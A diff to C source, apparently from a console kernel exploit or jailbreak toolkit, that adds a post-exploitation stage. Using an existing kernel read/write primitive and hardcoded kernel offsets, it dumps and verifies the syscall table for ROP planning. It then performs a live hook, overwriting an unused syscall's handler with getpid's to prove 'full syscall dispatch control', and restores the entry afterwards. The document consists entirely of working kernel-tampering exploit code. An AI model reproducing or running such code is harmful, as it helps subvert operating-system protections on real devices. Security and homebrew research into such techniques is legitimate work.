@@ -2200,6 +2200,10 @@ ring3_fallback:
             fflush(stdout);
         }
 
+        /* Variables hoisted for use by both sysent dump and verification */
+        int sysent_found = 0;
+        uint64_t sysent_kva = 0;
+
         /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
         {
             /* struct sysent (0x30 = 48 bytes, confirmed via etaHEN kexec.h):
@@ -2228,9 +2232,6 @@ ring3_fallback:
             /* Read sysentvec at known offset via DMAP */
             uint64_t sysentvec_kva = g_kdata_base + 0xd11bb8;
             uint64_t sysentvec_pa = va_to_pa_quiet(sysentvec_kva);
-
-            int sysent_found = 0;
-            uint64_t sysent_kva = 0;
 
             if (sysentvec_pa) {
                 uint8_t svec[24];
@@ -2356,6 +2357,135 @@ ring3_fallback:
                 }
             }
             fflush(stdout);
+        }
+
+        /* 4d-5: Sysent verification and live hook test */
+        if (sysent_found) {
+            printf("\n[*] Verifying sysent table...\n");
+            fflush(stdout);
+
+            /* Get nosys handler address (entry 0) */
+            uint64_t nosys_call = 0;
+            {
+                uint64_t pa = va_to_pa_quiet(sysent_kva + 8);
+                if (pa) kernel_copyout(g_dmap_base + pa, &nosys_call, 8);
+            }
+
+            /* Cross-check narg values for known syscalls */
+            static const struct { int num; int narg; const char *name; } verify[] = {
+                {20, 0, "getpid"}, {37, 2, "kill"}, {54, 3, "ioctl"},
+                {59, 3, "execve"}, {73, 2, "munmap"}, {74, 3, "mprotect"},
+                {165, 2, "sysarch"}, {202, 6, "sysctl"}, {477, 6, "mmap"},
+                {304, 1, "kldload"}, {305, 1, "kldunload"}, {308, 2, "kldstat"},
+            };
+            int narg_ok = 0, narg_total = 0;
+            for (unsigned i = 0; i < sizeof(verify)/sizeof(verify[0]); i++) {
+                uint64_t ent_kva = sysent_kva + (uint64_t)verify[i].num * SYSENT_STRIDE;
+                uint64_t pa = va_to_pa_quiet(ent_kva);
+                if (!pa) continue;
+                int32_t narg;
+                kernel_copyout(g_dmap_base + pa, &narg, 4);
+                narg_total++;
+                if (narg == verify[i].narg) narg_ok++;
+                else printf("    MISMATCH: %s narg=%d expected=%d\n",
+                            verify[i].name, narg, verify[i].narg);
+            }
+            printf("    narg cross-check: %d/%d matched\n", narg_ok, narg_total);
+
+            /* Count nosys entries in high range (600-723) */
+            int nosys_cnt = 0, checked = 0;
+            for (int i = 600; i < 724; i++) {
+                uint64_t pa = va_to_pa_quiet(sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
+                if (!pa) continue;
+                uint64_t call;
+                kernel_copyout(g_dmap_base + pa, &call, 8);
+                checked++;
+                if (call == nosys_call) nosys_cnt++;
+            }
+            printf("    nosys consistency: %d/%d high entries point to nosys (0x%lx)\n",
+                   nosys_cnt, checked, (unsigned long)nosys_call);
+
+            int sysent_verified = (narg_ok == narg_total && narg_total >= 10
+                                   && nosys_cnt > 30);
+            if (sysent_verified)
+                printf("[+] Sysent table verified!\n");
+            else
+                printf("[-] Sysent verification weak — proceeding cautiously.\n");
+            fflush(stdout);
+
+            /* Live hook test: redirect an unused syscall to getpid handler */
+            if (sysent_verified) {
+                /* Find an unused (nosys) syscall in the 710-723 range */
+                int test_sc = -1;
+                for (int i = 720; i >= 700; i--) {
+                    uint64_t pa = va_to_pa_quiet(
+                        sysent_kva + (uint64_t)i * SYSENT_STRIDE + 8);
+                    if (!pa) continue;
+                    uint64_t call;
+                    kernel_copyout(g_dmap_base + pa, &call, 8);
+                    if (call == nosys_call) { test_sc = i; break; }
+                }
+
+                if (test_sc >= 0) {
+                    printf("\n[*] Live sysent hook test: syscall %d\n", test_sc);
+
+                    uint64_t ent_kva = sysent_kva + (uint64_t)test_sc * SYSENT_STRIDE;
+
+                    /* Save original entry */
+                    uint8_t orig_ent[SYSENT_STRIDE];
+                    uint64_t ent_pa = va_to_pa_quiet(ent_kva);
+                    kernel_copyout(g_dmap_base + ent_pa, orig_ent, SYSENT_STRIDE);
+
+                    /* Call before modification — should get ENOSYS (78) */
+                    errno = 0;
+                    long ret0 = syscall(test_sc);
+                    int err0 = errno;
+                    printf("    Before: syscall(%d) = %ld, errno=%d (%s)\n",
+                           test_sc, ret0, err0,
+                           err0 == 78 ? "ENOSYS" : "other");
+
+                    /* Get getpid sy_call address */
+                    uint64_t getpid_pa = va_to_pa_quiet(
+                        sysent_kva + 20ULL * SYSENT_STRIDE + 8);
+                    uint64_t getpid_call = 0;
+                    kernel_copyout(g_dmap_base + getpid_pa, &getpid_call, 8);
+
+                    /* Write getpid handler into test syscall via DMAP */
+                    uint64_t call_pa = va_to_pa_quiet(ent_kva + 8);
+                    kernel_copyin(&getpid_call, g_dmap_base + call_pa, 8);
+
+                    /* Also set narg=0 to match getpid */
+                    int32_t zero = 0;
+                    uint64_t narg_pa = va_to_pa_quiet(ent_kva);
+                    kernel_copyin(&zero, g_dmap_base + narg_pa, 4);
+
+                    /* Call after modification — should return our PID */
+                    errno = 0;
+                    long ret1 = syscall(test_sc);
+                    int err1 = errno;
+                    pid_t real_pid = getpid();
+                    printf("    After:  syscall(%d) = %ld, errno=%d (real pid=%d)\n",
+                           test_sc, ret1, err1, real_pid);
+
+                    if (ret1 == real_pid && err1 == 0) {
+                        printf("[+] SYSENT HOOK VERIFIED — full syscall dispatch control!\n");
+                    } else if (ret1 != -1 && err1 == 0) {
+                        printf("[+] Sysent hook WORKED (ret=%ld, may differ due to td)\n",
+                               ret1);
+                    } else {
+                        printf("[-] Sysent hook did not behave as expected.\n");
+                        printf("    kernel_copyin to DMAP may not support writes,\n");
+                        printf("    or sysent page has write protection.\n");
+                    }
+
+                    /* Restore original entry */
+                    kernel_copyin(orig_ent, g_dmap_base + ent_pa, SYSENT_STRIDE);
+                    printf("    Restored sysent[%d]\n", test_sc);
+                    fflush(stdout);
+                } else {
+                    printf("[-] No unused syscall found in 700-720 range.\n");
+                }
+            }
         }
 
 idt_done: ;
